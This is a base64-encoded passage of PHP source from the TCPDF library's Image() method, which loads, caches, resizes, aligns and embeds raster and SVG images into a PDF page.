AgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoJCS8vIGNoZWNrIGlmIHdlIGFyZSBwYXNzaW5nIGFuIGltYWdlIGFzIGZpbGUgb3Igc3RyaW5nCgkJaWYgKCRmaWxlWzBdID09PSAnQCcpIHsKCQkJLy8gaW1hZ2UgZnJvbSBzdHJpbmcKCQkJJGltZ2RhdGEgPSBzdWJzdHIoJGZpbGUsIDEpOwoJCX0gZWxzZSB7IC8vIGltYWdlIGZpbGUKCQkJaWYgKCRmaWxlWzBdID09PSAnKicpIHsKCQkJCS8vIGltYWdlIGFzIGV4dGVybmFsIHN0cmVhbQoJCQkJJGZpbGUgPSBzdWJzdHIoJGZpbGUsIDEpOwoJCQkJJGV4dXJsID0gJGZpbGU7CgkJCX0KCQkJLy8gY2hlY2sgaWYgZmlsZSBleGlzdCBhbmQgaXQgaXMgdmFsaWQKCQkJaWYgKCFAJHRoaXMtPmZpbGVFeGlzdHMoJGZpbGUpKSB7CgkJCQlyZXR1cm4gZmFsc2U7CgkJCX0KICAgICAgICAgICAgaWYgKGZhbHNlICE9PSAkaW5mbyA9ICR0aGlzLT5nZXRJbWFnZUJ1ZmZlcigkZmlsZSkpIHsKICAgICAgICAgICAgICAgICRpbXNpemUgPSBhcnJheSgkaW5mb1sndyddLCAkaW5mb1snaCddKTsKICAgICAgICAgICAgfSBlbHNlaWYgKCgkaW1zaXplID0gQGdldGltYWdlc2l6ZSgkZmlsZSkpID09PSBGQUxTRSAmJiBzdHJwb3MoJGZpbGUsICdfX3RjcGRmXycuJHRoaXMtPmZpbGVfaWQuJ19pbWcnKSA9PT0gRkFMU0UpewogICAgICAgICAgICAgICAgJGltZ2RhdGEgPSAkdGhpcy0+Z2V0Q2FjaGVkRmlsZUNvbnRlbnRzKCRmaWxlKTsKICAgICAgICAgICAgfQoJCX0KCQlpZiAoIWVtcHR5KCRpbWdkYXRhKSkgewoJCQkvLyBjb3B5IGltYWdlIHRvIGNhY2hlCgkJCSRvcmlnaW5hbF9maWxlID0gJGZpbGU7CgkJCSRmaWxlID0gVENQREZfU1RBVElDOjpnZXRPYmpGaWxlbmFtZSgnaW1nJywgJHRoaXMtPmZpbGVfaWQpOwoJCQkkZnAgPSBUQ1BERl9TVEFUSUM6OmZvcGVuTG9jYWwoJGZpbGUsICd3Jyk7CgkJCWlmICghJGZwKSB7CgkJCQkkdGhpcy0+RXJyb3IoJ1VuYWJsZSB0byB3cml0ZSBmaWxlOiAnLiRmaWxlKTsKCQkJfQoJCQlmd3JpdGUoJGZwLCAkaW1nZGF0YSk7CgkJCWZjbG9zZSgkZnApOwoJCQl1bnNldCgkaW1nZGF0YSk7CgkJCSRpbXNpemUgPSBAZ2V0aW1hZ2VzaXplKCRmaWxlKTsKCQkJaWYgKCRpbXNpemUgPT09IEZBTFNFKSB7CgkJCQkkdGhpcy0+X3VubGluaygkZmlsZSk7CgkJCQkkZmlsZSA9ICRvcmlnaW5hbF9maWxlOwoJCQl9CgkJfQoJCWlmICgkaW1zaXplID09PSBGQUxTRSkgewoJCQlpZiAoKCR3ID4gMCkgQU5EICgkaCA+IDApKSB7CgkJCQkvLyBnZXQgbWVhc3VyZXMgZnJvbSBzcGVjaWZpZWQgZGF0YQoJCQkJJHB3ID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkdywgMCwgJHRoaXMtPnBkZnVuaXQsIHRydWUpICogJHRoaXMtPmltZ3NjYWxlICogJHRoaXMtPms7CgkJCQkkcGggPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRoLCAwLCAkdGhpcy0+cGRmdW5pdCwgdHJ1ZSkgKiAkdGhpcy0+aW1nc2NhbGUgKiAkdGhpcy0+azsKCQkJCSRpbXNpemUgPSBhcnJheSgkcHcsICRwaCk7CgkJCX0gZWxzZSB7CgkJCQkkdGhpcy0+RXJyb3IoJ1tJbWFnZV0gVW5hYmxlIHRvIGdldCB0aGUgc2l6ZSBvZiB0aGUgaW1hZ2U6ICcuJGZpbGUpOwoJCQl9CgkJfQoJCS8vIGZpbGUgaGFzaAoJCSRmaWxlaGFzaCA9IG1kNSgkZmlsZSk7CgkJLy8gZ2V0IG9yaWdpbmFsIGltYWdlIHdpZHRoIGFuZCBoZWlnaHQgaW4gcGl4ZWxzCgkJbGlzdCgkcGl4dywgJHBpeGgpID0gJGltc2l6ZTsKCQkvLyBjYWxjdWxhdGUgaW1hZ2Ugd2lkdGggYW5kIGhlaWdodCBvbiBkb2N1bWVudAoJCWlmICgoJHcgPD0gMCkgQU5EICgkaCA8PSAwKSkgewoJCQkvLyBjb252ZXJ0IGltYWdlIHNpemUgdG8gZG9jdW1lbnQgdW5pdAoJCQkkdyA9ICR0aGlzLT5waXhlbHNUb1VuaXRzKCRwaXh3KTsKCQkJJGggPSAkdGhpcy0+cGl4ZWxzVG9Vbml0cygkcGl4aCk7CgkJfSBlbHNlaWYgKCR3IDw9IDApIHsKCQkJJHcgPSAkaCAqICRwaXh3IC8gJHBpeGg7CgkJfSBlbHNlaWYgKCRoIDw9IDApIHsKCQkJJGggPSAkdyAqICRwaXhoIC8gJHBpeHc7CgkJfSBlbHNlaWYgKCgkZml0Ym94ICE9PSBmYWxzZSkgQU5EICgkdyA+IDApIEFORCAoJGggPiAwKSkgewoJCQlpZiAoc3RybGVuKCRmaXRib3gpICE9PSAyKSB7CgkJCQkvLyBzZXQgZGVmYXVsdCBhbGlnbm1lbnQKCQkJCSRmaXRib3ggPSAnLS0nOwoJCQl9CgkJCS8vIHNjYWxlIGltYWdlIGRpbWVuc2lvbnMgcHJvcG9ydGlvbmFsbHkgdG8gZml0IHdpdGhpbiB0aGUgKCR3LCAkaCkgYm94CgkJCWlmICgoKCR3ICogJHBpeGgpIC8gKCRoICogJHBpeHcpKSA8IDEpIHsKCQkJCS8vIHN0b3JlIGN1cnJlbnQgaGVpZ2h0CgkJCQkkb2xkaCA9ICRoOwoJCQkJLy8gY2FsY3VsYXRlIG5ldyBoZWlnaHQKCQkJCSRoID0gJHcgKiAkcGl4aCAvICRwaXh3OwoJCQkJLy8gaGVpZ2h0IGRpZmZlcmVuY2UKCQkJCSRoZGlmZiA9ICgkb2xkaCAtICRoKTsKCQkJCS8vIHZlcnRpY2FsIGFsaWdubWVudAoJCQkJc3dpdGNoIChzdHJ0b3VwcGVyKCRmaXRib3hbMV0pKSB7CgkJCQkJY2FzZSAnVCc6IHsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWNhc2UgJ00nOiB7CgkJCQkJCSR5ICs9ICgkaGRpZmYgLyAyKTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWNhc2UgJ0InOiB7CgkJCQkJCSR5ICs9ICRoZGlmZjsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJfQoJCQl9IGVsc2UgewoJCQkJLy8gc3RvcmUgY3VycmVudCB3aWR0aAoJCQkJJG9sZHcgPSAkdzsKCQkJCS8vIGNhbGN1bGF0ZSBuZXcgd2lkdGgKCQkJCSR3ID0gJGggKiAkcGl4dyAvICRwaXhoOwoJCQkJLy8gd2lkdGggZGlmZmVyZW5jZQoJCQkJJHdkaWZmID0gKCRvbGR3IC0gJHcpOwoJCQkJLy8gaG9yaXpvbnRhbCBhbGlnbm1lbnQKCQkJCXN3aXRjaCAoc3RydG91cHBlcigkZml0Ym94WzBdKSkgewoJCQkJCWNhc2UgJ0wnOiB7CgkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkkeCAtPSAkd2RpZmY7CgkJCQkJCX0KCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWNhc2UgJ0MnOiB7CgkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkkeCAtPSAoJHdkaWZmIC8gMik7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkeCArPSAoJHdkaWZmIC8gMik7CgkJCQkJCX0KCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWNhc2UgJ1InOiB7CgkJCQkJCWlmICghJHRoaXMtPnJ0bCkgewoJCQkJCQkJJHggKz0gJHdkaWZmOwoJCQkJCQl9CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCQkvLyBmaXQgdGhlIGltYWdlIG9uIGF2YWlsYWJsZSBzcGFjZQoJCWxpc3QoJHcsICRoLCAkeCwgJHkpID0gJHRoaXMtPmZpdEJsb2NrKCR3LCAkaCwgJHgsICR5LCAkZml0b25wYWdlKTsKCQkvLyBjYWxjdWxhdGUgbmV3IG1pbmltdW0gZGltZW5zaW9ucyBpbiBwaXhlbHMKCQkkbmV3dyA9IHJvdW5kKCR3ICogJHRoaXMtPmsgKiAkZHBpIC8gJHRoaXMtPmRwaSk7CgkJJG5ld2ggPSByb3VuZCgkaCAqICR0aGlzLT5rICogJGRwaSAvICR0aGlzLT5kcGkpOwoJCS8vIGNoZWNrIGlmIHJlc2l6ZSBpcyBuZWNlc3NhcnkgKHJlc2l6ZSBpcyB1c2VkIG9ubHkgdG8gcmVkdWNlIHRoZSBpbWFnZSkKCQkkbmV3c2l6ZSA9ICgkbmV3dyAqICRuZXdoKTsKCQkkcGl4c2l6ZSA9ICgkcGl4dyAqICRwaXhoKTsKCQlpZiAoaW50dmFsKCRyZXNpemUpID09IDIpIHsKCQkJJHJlc2l6ZSA9IHRydWU7CgkJfSBlbHNlaWYgKCRuZXdzaXplID49ICRwaXhzaXplKSB7CgkJCSRyZXNpemUgPSBmYWxzZTsKCQl9CgkJLy8gY2hlY2sgaWYgaW1hZ2UgaGFzIGJlZW4gYWxyZWFkeSBhZGRlZCBvbiBkb2N1bWVudAoJCSRuZXdpbWFnZSA9IHRydWU7CgkJaWYgKGluX2FycmF5KCRmaWxlLCAkdGhpcy0+aW1hZ2VrZXlzKSkgewoJCQkkbmV3aW1hZ2UgPSBmYWxzZTsKCQkJLy8gZ2V0IGV4aXN0aW5nIGltYWdlIGRhdGEKCQkJJGluZm8gPSAkdGhpcy0+Z2V0SW1hZ2VCdWZmZXIoJGZpbGUpOwoJCQlpZiAoc3RycG9zKCRmaWxlLCAnX190Y3BkZl8nLiR0aGlzLT5maWxlX2lkLidfaW1nbWFza18nKSA9PT0gRkFMU0UpIHsKCQkJCS8vIGNoZWNrIGlmIHRoZSBuZXdlciBpbWFnZSBpcyBsYXJnZXIKCQkJCSRvbGRzaXplID0gKCRpbmZvWyd3J10gKiAkaW5mb1snaCddKTsKCQkJCWlmICgoKCRvbGRzaXplIDwgJG5ld3NpemUpIEFORCAoJHJlc2l6ZSkpIE9SICgoJG9sZHNpemUgPCAkcGl4c2l6ZSkgQU5EICghJHJlc2l6ZSkpKSB7CgkJCQkJJG5ld2ltYWdlID0gdHJ1ZTsKCQkJCX0KCQkJfQoJCX0gZWxzZWlmICgoJGlzbWFzayA9PT0gZmFsc2UpIEFORCAoJGltZ21hc2sgPT09IGZhbHNlKSBBTkQgKHN0cnBvcygkZmlsZSwgJ19fdGNwZGZfJy4kdGhpcy0+ZmlsZV9pZC4nX2ltZ21hc2tfJykgPT09IEZBTFNFKSkgewoJCQkvLyBjcmVhdGUgdGVtcCBpbWFnZSBmaWxlICh3aXRob3V0IGFscGhhIGNoYW5uZWwpCgkJCSR0ZW1wZmlsZV9wbGFpbiA9IEtfUEFUSF9DQUNIRS4nX190Y3BkZl8nLiR0aGlzLT5maWxlX2lkLidfaW1nbWFza19wbGFpbl8nLiRmaWxlaGFzaDsKCQkJLy8gY3JlYXRlIHRlbXAgYWxwaGEgZmlsZQoJCQkkdGVtcGZpbGVfYWxwaGEgPSBLX1BBVEhfQ0FDSEUuJ19fdGNwZGZfJy4kdGhpcy0+ZmlsZV9pZC4nX2ltZ21hc2tfYWxwaGFfJy4kZmlsZWhhc2g7CgkJCS8vIGNoZWNrIGZvciBjYWNoZWQgaW1hZ2VzCgkJCWlmIChpbl9hcnJheSgkdGVtcGZpbGVfcGxhaW4sICR0aGlzLT5pbWFnZWtleXMpKSB7CgkJCQkvLyBnZXQgZXhpc3RpbmcgaW1hZ2UgZGF0YQoJCQkJJGluZm8gPSAkdGhpcy0+Z2V0SW1hZ2VCdWZmZXIoJHRlbXBmaWxlX3BsYWluKTsKCQkJCS8vIGNoZWNrIGlmIHRoZSBuZXdlciBpbWFnZSBpcyBsYXJnZXIKCQkJCSRvbGRzaXplID0gKCRpbmZvWyd3J10gKiAkaW5mb1snaCddKTsKCQkJCWlmICgoKCRvbGRzaXplIDwgJG5ld3NpemUpIEFORCAoJHJlc2l6ZSkpIE9SICgoJG9sZHNpemUgPCAkcGl4c2l6ZSkgQU5EICghJHJlc2l6ZSkpKSB7CgkJCQkJJG5ld2ltYWdlID0gdHJ1ZTsKCQkJCX0gZWxzZSB7CgkJCQkJJG5ld2ltYWdlID0gZmFsc2U7CgkJCQkJLy8gZW1iZWQgbWFzayBpbWFnZQoJCQkJCSRpbWdtYXNrID0gJHRoaXMtPkltYWdlKCR0ZW1wZmlsZV9hbHBoYSwgJHgsICR5LCAkdywgJGgsICdQTkcnLCAnJywgJycsICRyZXNpemUsICRkcGksICcnLCB0cnVlLCBmYWxzZSk7CgkJCQkJLy8gZW1iZWQgaW1hZ2UsIG1hc2tlZCB3aXRoIHByZXZpb3VzbHkgZW1iZWRkZWQgbWFzawoJCQkJCXJldHVybiAkdGhpcy0+SW1hZ2UoJHRlbXBmaWxlX3BsYWluLCAkeCwgJHksICR3LCAkaCwgJHR5cGUsICRsaW5rLCAkYWxpZ24sICRyZXNpemUsICRkcGksICRwYWxpZ24sIGZhbHNlLCAkaW1nbWFzayk7CgkJCQl9CgkJCX0KCQl9CgkJaWYgKCRuZXdpbWFnZSkgewoJCQkvL0ZpcnN0IHVzZSBvZiBpbWFnZSwgZ2V0IGluZm8KCQkJJHR5cGUgPSBzdHJ0b2xvd2VyKCR0eXBlKTsKCQkJaWYgKCR0eXBlID09ICcnKSB7CgkJCQkkdHlwZSA9IFRDUERGX0lNQUdFUzo6Z2V0SW1hZ2VGaWxlVHlwZSgkZmlsZSwgJGltc2l6ZSk7CgkJCX0gZWxzZWlmICgkdHlwZSA9PSAnanBnJykgewoJCQkJJHR5cGUgPSAnanBlZyc7CgkJCX0KCQkJLy8gU3BlY2lmaWMgaW1hZ2UgaGFuZGxlcnMgKGRlZmluZWQgb24gVENQREZfSU1BR0VTIENMQVNTKQoJCQkkbXRkID0gJ19wYXJzZScuJHR5cGU7CgkJCS8vIEdEIGltYWdlIGhhbmRsZXIgZnVuY3Rpb24KCQkJJGdkZnVuY3Rpb24gPSAnaW1hZ2VjcmVhdGVmcm9tJy4kdHlwZTsKCQkJJGluZm8gPSBmYWxzZTsKCQkJaWYgKChtZXRob2RfZXhpc3RzKCdUQ1BERl9JTUFHRVMnLCAkbXRkKSkgQU5EICghKCRyZXNpemUgQU5EIChmdW5jdGlvbl9leGlzdHMoJGdkZnVuY3Rpb24pIE9SIGV4dGVuc2lvbl9sb2FkZWQoJ2ltYWdpY2snKSkpKSkgewoJCQkJLy8gVENQREYgaW1hZ2UgZnVuY3Rpb25zCgkJCQkkaW5mbyA9IFRDUERGX0lNQUdFUzo6JG10ZCgkZmlsZSk7CgkJCQlpZiAoKCRpc21hc2sgPT09IGZhbHNlKSBBTkQgKCRpbWdtYXNrID09PSBmYWxzZSkgQU5EIChzdHJwb3MoJGZpbGUsICdfX3RjcGRmXycuJHRoaXMtPmZpbGVfaWQuJ19pbWdtYXNrXycpID09PSBGQUxTRSkKCQkJCQlBTkQgKCgkaW5mbyA9PT0gJ3BuZ2FscGhhJykgT1IgKGlzc2V0KCRpbmZvWyd0cm5zJ10pIEFORCAhZW1wdHkoJGluZm9bJ3RybnMnXSkpKSkgewoJCQkJCXJldHVybiAkdGhpcy0+SW1hZ2VQbmdBbHBoYSgkZmlsZSwgJHgsICR5LCAkcGl4dywgJHBpeGgsICR3LCAkaCwgJ1BORycsICRsaW5rLCAkYWxpZ24sICRyZXNpemUsICRkcGksICRwYWxpZ24sICRmaWxlaGFzaCk7CgkJCQl9CgkJCX0KCQkJaWYgKCgkaW5mbyA9PT0gZmFsc2UpIEFORCBmdW5jdGlvbl9leGlzdHMoJGdkZnVuY3Rpb24pKSB7CgkJCQl0cnkgewoJCQkJCS8vIEdEIGxpYnJhcnkKCQkJCQkkaW1nID0gJGdkZnVuY3Rpb24oJGZpbGUpOwoJCQkJCWlmICgkaW1nICE9PSBmYWxzZSkgewoJCQkJCQlpZiAoJHJlc2l6ZSkgewoJCQkJCQkJJGltZ3IgPSBpbWFnZWNyZWF0ZXRydWVjb2xvcigkbmV3dywgJG5ld2gpOwoJCQkJCQkJaWYgKCgkdHlwZSA9PSAnZ2lmJykgT1IgKCR0eXBlID09ICdwbmcnKSkgewoJCQkJCQkJCSRpbWdyID0gVENQREZfSU1BR0VTOjpzZXRHREltYWdlVHJhbnNwYXJlbmN5KCRpbWdyLCAkaW1nKTsKCQkJCQkJCX0KCQkJCQkJCWltYWdlY29weXJlc2FtcGxlZCgkaW1nciwgJGltZywgMCwgMCwgMCwgMCwgJG5ld3csICRuZXdoLCAkcGl4dywgJHBpeGgpOwoJCQkJCQkJJGltZyA9ICRpbWdyOwoJCQkJCQl9CgkJCQkJCWlmICgoJHR5cGUgPT0gJ2dpZicpIE9SICgkdHlwZSA9PSAncG5nJykpIHsKCQkJCQkJCSRpbmZvID0gVENQREZfSU1BR0VTOjpfdG9QTkcoJGltZywgVENQREZfU1RBVElDOjpnZXRPYmpGaWxlbmFtZSgnaW1nJywgJHRoaXMtPmZpbGVfaWQpKTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRpbmZvID0gVENQREZfSU1BR0VTOjpfdG9KUEVHKCRpbWcsICR0aGlzLT5qcGVnX3F1YWxpdHksIFRDUERGX1NUQVRJQzo6Z2V0T2JqRmlsZW5hbWUoJ2ltZycsICR0aGlzLT5maWxlX2lkKSk7CgkJCQkJCX0KCQkJCQl9CgkJCQl9IGNhdGNoKEV4Y2VwdGlvbiAkZSkgewoJCQkJCSRpbmZvID0gZmFsc2U7CgkJCQl9CgkJCX0KCQkJaWYgKCgkaW5mbyA9PT0gZmFsc2UpIEFORCBleHRlbnNpb25fbG9hZGVkKCdpbWFnaWNrJykpIHsKCQkJCXRyeSB7CgkJCQkJLy8gSW1hZ2VNYWdpY2sgbGlicmFyeQoJCQkJCSRpbWcgPSBuZXcgSW1hZ2ljaygpOwoJCQkJCWlmICgkdHlwZSA9PSAnc3ZnJykgewoJCQkJCQlpZiAoJGZpbGVbMF0gPT09ICdAJykgewoJCQkJCQkJLy8gaW1hZ2UgZnJvbSBzdHJpbmcKCQkJCQkJCSRzdmdpbWcgPSBzdWJzdHIoJGZpbGUsIDEpOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJLy8gZ2V0IFNWRyBmaWxlIGNvbnRlbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdmdpbWcgPSAkdGhpcy0+Z2V0Q2FjaGVkRmlsZUNvbnRlbnRzKCRmaWxlKTsKCQkJCQkJfQoJCQkJCQlpZiAoJHN2Z2ltZyAhPT0gRkFMU0UpIHsKCQkJCQkJCS8vIGdldCB3aWR0aCBhbmQgaGVpZ2h0CgkJCQkJCQkkcmVncyA9IGFycmF5KCk7CgkJCQkJCQlpZiAocHJlZ19tYXRjaCgnLzxzdmcoW15cPl0qKT4vc2knLCAkc3ZnaW1nLCAkcmVncykpIHsKCQkJCQkJCQkkc3ZndGFnID0gJHJlZ3NbMV07CgkJCQkJCQkJJHRtcCA9IGFycmF5KCk7CgkJCQkJCQkJaWYgKHByZWdfbWF0Y2goJy9bXHNdK3dpZHRoW1xzXSo9W1xzXSoiKFteIl0qKSIvc2knLCAkc3ZndGFnLCAkdG1wKSkgewoJCQkJCQkJCQkkb3cgPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR0bXBbMV0sIDEsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk7CgkJCQkJCQkJCSRvd3UgPSBzcHJpbnRmKCclRicsICgkb3cgKiAkZHBpIC8gNzIpKS4kdGhpcy0+cGRmdW5pdDsKCQkJCQkJCQkJJHN2Z3RhZyA9IHByZWdfcmVwbGFjZSgnL1tcc10rd2lkdGhbXHNdKj1bXHNdKiJbXiJdKiIvc2knLCAnIHdpZHRoPSInLiRvd3UuJyInLCAkc3ZndGFnLCAxKTsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkkb3cgPSAkdzsKCQkJCQkJCQl9CgkJCQkJCQkJJHRtcCA9IGFycmF5KCk7CgkJCQkJCQkJaWYgKHByZWdfbWF0Y2goJy9bXHNdK2hlaWdodFtcc10qPVtcc10qIihbXiJdKikiL3NpJywgJHN2Z3RhZywgJHRtcCkpIHsKCQkJCQkJCQkJJG9oID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkdG1wWzFdLCAxLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOwoJCQkJCQkJCQkkb2h1ID0gc3ByaW50ZignJUYnLCAoJG9oICogJGRwaSAvIDcyKSkuJHRoaXMtPnBkZnVuaXQ7CgkJCQkJCQkJCSRzdmd0YWcgPSBwcmVnX3JlcGxhY2UoJy9bXHNdK2hlaWdodFtcc10qPVtcc10qIlteIl0qIi9zaScsICcgaGVpZ2h0PSInLiRvaHUuJyInLCAkc3ZndGFnLCAxKTsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkkb2ggPSAkaDsKCQkJCQkJCQl9CgkJCQkJCQkJJHRtcCA9IGFycmF5KCk7CgkJCQkJCQkJaWYgKCFwcmVnX21hdGNoKCcvW1xzXSt2aWV3Qm94W1xzXSo9W1xzXSoiW1xzXSooWzAtOVwuXSspW1xzXSsoWzAtOVwuXSspW1xzXSsoWzAtOVwuXSspW1xzXSsoWzAtOVwuXSspW1xzXSoiL3NpJywgJHN2Z3RhZywgJHRtcCkpIHsKCQkJCQkJCQkJJHZidyA9ICgkb3cgKiAkdGhpcy0+aW1nc2NhbGUgKiAkdGhpcy0+ayk7CgkJCQkJCQkJCSR2YmggPSAoJG9oICogJHRoaXMtPmltZ3NjYWxlICogJHRoaXMtPmspOwoJCQkJCQkJCQkkdmJveCA9IHNwcmludGYoJyB2aWV3Qm94PSIwIDAgJUYgJUYiICcsICR2YncsICR2YmgpOwoJCQkJCQkJCQkkc3ZndGFnID0gJHZib3guJHN2Z3RhZzsKCQkJCQkJCQl9CgkJCQkJCQkJJHN2Z2ltZyA9IHByZWdfcmVwbGFjZSgnLzxzdmcoW15cPl0qKT4vc2knLCAnPHN2ZycuJHN2Z3RhZy4nPicsICRzdmdpbWcsIDEpOwoJCQkJCQkJfQoJCQkJCQkJJGltZy0+cmVhZEltYWdlQmxvYigkc3ZnaW1nKTsKCQkJCQkJfQoJCQkJCX0gZWxzZSB7CgkJCQkJCSRpbWctPnJlYWRJbWFnZSgkZmlsZSk7CgkJCQkJfQoJCQkJCWlmICgkcmVzaXplKSB7CgkJCQkJCSRpbWctPnJlc2l6ZUltYWdlKCRuZXd3LCAkbmV3aCwgMTAsIDEsIGZhbHNlKTsKCQkJCQl9CgkJCQkJJGltZy0+c2V0Q29tcHJlc3Npb25RdWFsaXR5KCR0aGlzLT5qcGVnX3F1YWxpdHkpOwoJCQkJCSRpbWctPnNldEltYWdlRm9ybWF0KCdqcGVnJyk7CgkJCQkJJHRlbXBuYW1lID0gVENQREZfU1RBVElDOjpnZXRPYmpGaWxlbmFtZSgnaW1nJywgJHRoaXMtPmZpbGVfaWQpOwoJCQkJCSRpbWctPndyaXRlSW1hZ2UoJHRlbXBuYW1lKTsKCQkJCQkkaW5mbyA9IFRDUERGX0lNQUdFUzo6X3BhcnNlanBlZygkdGVtcG5hbWUpOwoJCQkJCSR0aGlzLT5fdW5saW5rKCR0ZW1wbmFtZSk7CgkJCQkJJGltZy0+ZGVzdHJveSgpOwoJCQkJfSBjYXRjaChFeGNlcHRpb24gJGUpIHsKCQkJCQkkaW5mbyA9IGZhbHNlOwoJCQkJfQoJCQl9CgkJCWlmICgkaW5mbyA9PT0gZmFsc2UpIHsKCQkJCS8vIHVuYWJsZSB0byBwcm9jZXNzIGltYWdlCgkJCQlyZXR1cm4gZmFsc2U7CgkJCX0KCQkJaWYgKCRpc21hc2spIHsKCQkJCS8vIGZvcmNlIGdyYXlzY2FsZQoJCQkJJGluZm9bJ2NzJ10gPSAnRGV2aWNlR3JheSc7CgkJCX0KCQkJaWYgKCRpbWdtYXNrICE9PSBmYWxzZSkgewoJCQkJJGluZm9bJ21hc2tlZCddID0gJGltZ21hc2s7CgkJCX0KCQkJaWYgKCFlbXB0eSgkZXh1cmwpKSB7CgkJCQkkaW5mb1snZXh1cmwnXSA9ICRleHVybDsKCQkJfQoJCQkvLyBhcnJheSBvZiBhbHRlcm5hdGl2ZSBpbWFnZXMKCQkJJGluZm9bJ2FsdGltZ3MnXSA9ICRhbHRpbWdzOwoJCQkvLyBhZGQgaW1hZ2UgdG8gZG9jdW1lbnQKCQkJJGluZm9bJ2knXSA9ICR0aGlzLT5zZXRJbWFnZUJ1ZmZlcigkZmlsZSwgJGluZm8pOwoJCX0KCQkvLyBzZXQgYWxpZ25tZW50CgkJJHRoaXMtPmltZ19yYl94ID0gJHggKyAkdzsKCQkkdGhpcy0+aW1nX3JiX3kgPSAkeSArICRoOwoKCQkvLyBzZXQgYWxpZ25tZW50CgkJaWYgKCRwYWxpZ24gPT0gJ0wnKSB7CgkJCSR4aW1nID0gJHRoaXMtPmxNYXJnaW47CgkJfSBlbHNlaWYgKCRwYWxpZ24gPT0gJ0MnKSB7CgkJCSR4aW1nID0gKCR0aGlzLT53ICsgJHRoaXMtPmxNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbiAtICR3KSAvIDI7CgkJfSBlbHNlaWYgKCRwYWxpZ24gPT0gJ1InKSB7CgkJCSR4aW1nID0gJHRoaXMtPncgLSAkdGhpcy0+ck1hcmdpbiAtICR3OwoJCX0gZWxzZSB7CgkJCSR4aW1nID0gJHRoaXMtPnJ0bCA/ICR4IC0gJHcgOiAkeDsKCQl9CgoJCWlmICgkaXNtYXNrIE9SICRoaWRkZW4pIHsKCQkJLy8gaW1hZ2UgaXMgbm90IGRpc3BsYXllZAoJCQlyZXR1cm4gJGluZm9bJ2knXTsKCQl9CgkJJHhraW1nID0gJHhpbWcgKiAkdGhpcy0+azsKCQlpZiAoISRhbHQpIHsKCQkJLy8gb25seSBub24tYWx0ZXJuYXRpdmUgaW1tYWdlcyB3aWxsIGJlIHNldAoJCQkkdGhpcy0+X291dChzcHJpbnRmKCdxICVGIDAgMCAlRiAlRiAlRiBjbSAvSSV1IERvIFEnLCAoJHcgKiAkdGhpcy0+ayksICgkaCAqICR0aGlzLT5rKSwgJHhraW1nLCAoKCR0aGlzLT5oIC0gKCR5ICsgJGgpKSAqICR0aGlzLT5rKSwgJGluZm9bJ2knXSkpOwoJCX0KCQlpZiAoIWVtcHR5KCRib3JkZXIpKSB7CgkJCSRieCA9ICR0aGlzLT54OwoJCQkkYnkgPSAkdGhpcy0+eTsKCQkJJHRoaXMtPnggPSAkeGltZzsKCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCSR0aGlzLT54ICs9ICR3OwoJCQl9CgkJCSR0aGlzLT55ID0gJHk7CgkJCSR0aGlzLT5DZWxsKCR3LCAkaCwgJycsICRib3JkZXIsIDAsICcnLCAwLCAnJywgMCwgdHJ1ZSk7CgkJCSR0aGlzLT54ID0gJGJ4OwoJCQkkdGhpcy0+eSA9ICRieTsKCQl9CgkJaWYgKCRsaW5rKSB7CgkJCSR0aGlzLT5MaW5rKCR4aW1nLCAkeSwgJHcsICRoLCAkbGluaywgMCk7CgkJfQoJCS8vIHNldCBwb2ludGVyIHRvIGFsaWduIHRoZSBuZXh0IHRleHQvb2JqZWN0cwoJCXN3aXRjaCgkYWxpZ24pIHsKCQkJY2FzZSAnVCc6IHsKCQkJCSR0aGlzLT55ID0gJHk7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT5pbWdfcmJfeDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ00nOiB7CgkJCQkkdGhpcy0+eSA9ICR5ICsgcm91bmQoJGgvMik7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT5pbWdfcmJfeDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ0InOiB7CgkJCQkkdGhpcy0+eSA9ICR0aGlzLT5pbWdfcmJfeTsKCQkJCSR0aGlzLT54ID0gJHRoaXMtPmltZ19yYl94OwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnTic6IHsKCQkJCSR0aGlzLT5zZXRZKCR0aGlzLT5pbWdfcmJfeSk7CgkJCQlicmVhazsKCQkJfQoJCQlkZWZhdWx0OnsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCSR0aGlzLT5lbmRsaW5leCA9ICR0aGlzLT5pbWdfcmJfeDsKCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkvLyB3ZSBhcmUgaW5zaWRlIGFuIFhPYmplY3QgdGVtcGxhdGUKCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydpbWFnZXMnXVtdID0gJGluZm9bJ2knXTsKCQl9CgkJcmV0dXJuICRpbmZvWydpJ107Cgl9CgoJLyoqCgkgKiBFeHRyYWN0IGluZm8gZnJvbSBhIFBORyBpbWFnZSB3aXRoIGFscGhhIGNoYW5uZWwgdXNpbmcgdGhlIEltYWdpY2sgb3IgR0QgbGlicmFyeS4KCSAqIEBwYXJhbSBzdHJpbmcgJGZ